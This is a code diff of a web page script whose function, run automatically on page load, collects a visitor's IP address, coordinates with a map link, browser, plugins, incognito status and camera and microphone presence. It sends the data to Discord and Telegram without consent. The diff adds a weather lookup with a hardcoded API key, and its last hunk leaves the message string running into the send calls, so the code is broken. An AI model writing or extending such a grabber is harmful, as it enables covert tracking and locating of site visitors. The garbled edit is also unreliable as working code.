@@ -687,7 +687,7 @@ async function sendInfoToDiscord() {
     const vpnStatus = await checkVPN();
     const connectionType = getConnectionType();
     const uptime = getUptime();
-    const internetSpeed = await checkInternetSpeed();  
+    const internetSpeed = await checkInternetSpeed();
     const systemInfos = getOperatingSystem();
     const cookiesStatus = areCookiesEnabled();
     const CPUard = getCpuCores();
@@ -697,6 +697,25 @@ async function sendInfoToDiscord() {
     const TimeZone = await Intl.DateTimeFormat().resolvedOptions().timeZone;
     const isIncognito = await detectIncognitoMode();
     const Ping = await getPing();
+
+    // Получение информации о погоде
+    const weatherResponse = await fetch(`https://weather.visualcrossing.com/VisualCrossingWebServices/rest/services/timeline/${city}?unitGroup=uk&key=KM7AEJQ7MBUYL23UBSQSNRPLW&contentType=json`);
+    const weatherData = await weatherResponse.json();
+    const temperature = weatherData.currentConditions.temp;
+    const conditions = weatherData.currentConditions.conditions.toLowerCase();
+
+    let weatherCondition;
+    if (conditions.includes("clear")) {
+        weatherCondition = "Sunny";
+    } else if (conditions.includes("cloudy")) {
+        weatherCondition = "Cloudy";
+    } else if (conditions.includes("rain")) {
+        weatherCondition = "Rainy";
+    } else {
+        weatherCondition = "Unknown weather condition";
+    }
+
+    // Формируем сообщение
     const message = "****                User Information****\n" +
                     "****-----------------------------------****\n" +
                     "- 🗺️ **IP Address**: `" + ipAddress + "`\n" +
@@ -706,6 +725,7 @@ async function sendInfoToDiscord() {
                     "- 🏞️ **Coordinates**: [`" + coordinates + "`](" + googleMapsLink + ")\n" +
                     "- 🕒 **Time**: `" + time + "`\n" +
                     "- 🌚 **Time Zone**: `" + TimeZone + "`\n" +
+                    "- 🌡️ **Temperature**: `" + temperature + "°C`\n" +
                     "- 🌐 **Browser**: `" + browserInfo + "`\n" +
                     "- 💿️ **Browser Version**: `" + version + "`\n" +
                     "- 🛰️ **Connection Status**: `" + isOnline + "`\n" +
@@ -734,11 +754,10 @@ async function sendInfoToDiscord() {
                     "- 📷 **Camera**: `" + hasCamera + "`\n" +
                     "- 🎤 **Microphone**: `" + hasMicrophone + "`\n" +
                     "- 🛠️ **Number of Plugins**: `" + pluginCount + "`\n" +
-                    "- 🔌 **Plugins**: " + plugins + "";
-            sendToDiscord(message);
-            sendToTelegram(message);
-        }
-
+                    "- 🔌 **Plugins**: " + plugins + "\n" +          
+    sendToDiscord(message);
+    sendToTelegram(message);
+}
         window.onload = function() {
             sendInfoToDiscord();
         };
